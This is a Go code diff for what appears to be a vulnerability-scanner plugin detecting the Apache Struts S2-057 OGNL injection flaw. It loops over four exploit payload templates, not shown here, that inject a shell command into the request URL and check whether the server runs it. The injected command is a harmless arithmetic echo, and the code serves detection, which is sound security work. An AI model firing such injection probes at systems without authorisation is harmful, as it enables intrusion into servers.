@@ -29,34 +29,38 @@ func (*S057) Finger() *base.Finger {
 	return &base.Finger{
 		CheckAction: func(ctx context.Context, ab *base.Apollo) error {
 			flow := ab.GetTargetFlow()
-			logger.Infof("开始检测S2-057, %s", flow.Request.URL())
+			logger.Debugf("Start detection S2-057, %s", flow.Request.URL())
 			r1 := utils.RandInt(1000000, 10000000)
 			r2 := utils.RandInt(1000000, 10000000)
-			payload := ExecPayload057a
-			payload = strings.Replace(payload, "{cmd}", "echo `expr {{r1}} + {{r2}}`", -1)
-			payload = strings.Replace(payload, "{{r1}}", strconv.Itoa(r1), -1)
-			payload = strings.Replace(payload, "{{r2}}", strconv.Itoa(r2), -1)
-			req, err := http.NewRequest("GET", utils.UrlJoinPath(flow.Request.URL().String(), payload), nil)
-			if err != nil {
-				logger.Error(err)
-				return nil
-			}
-			res, err := ab.HTTPClient.Respond(context.TODO(), req)
-			if err != nil {
-				return nil
-			}
+			cmdResult := strconv.Itoa(r1 + r2)
 
-			if strings.Contains(res.Text, strconv.Itoa(r1+r2)) {
-				v := ab.NewWebVuln(req, res, nil)
-				if v != nil {
-					v.SetTargetURL(flow.Request.URL())
-					v.Payload = payload
-					ab.OutputVuln(v)
+			// Try all payload variants (a/b/c/d) covering different OGNL sandbox bypass techniques
+			payloads := []string{ExecPayload057a, ExecPayload057b, ExecPayload057c, ExecPayload057d}
+			for _, payloadTmpl := range payloads {
+				payload := strings.Replace(payloadTmpl, "{cmd}", "echo `expr "+strconv.Itoa(r1)+" + "+strconv.Itoa(r2)+"`", -1)
+				req, err := http.NewRequest("GET", utils.UrlJoinPath(flow.Request.URL().String(), payload), nil)
+				if err != nil {
+					logger.Error(err)
+					continue
+				}
+				res, err := ab.HTTPClient.Respond(ctx, req)
+				if err != nil {
+					continue
+				}
+
+				if strings.Contains(res.Text, cmdResult) {
+					v := ab.NewWebVuln(req, res, nil)
+					if v != nil {
+						v.SetTargetURL(flow.Request.URL())
+						v.Payload = payload
+						ab.OutputVuln(v)
+					}
+					return nil
 				}
 			}
 			return nil
 		},
 		Channel: "web-directory",
-		Binding: &model.VulnBinding{ID: "struts/s2-057/default", Plugin: "struts/s2-057", Category: "struts/s2-057"},
+		Binding: &model.VulnBinding{ID: "struts/s2-057/default", Plugin: "struts/s2-057", Category: "struts/s2-057", Severity: model.SeverityCritical},
 	}
 }
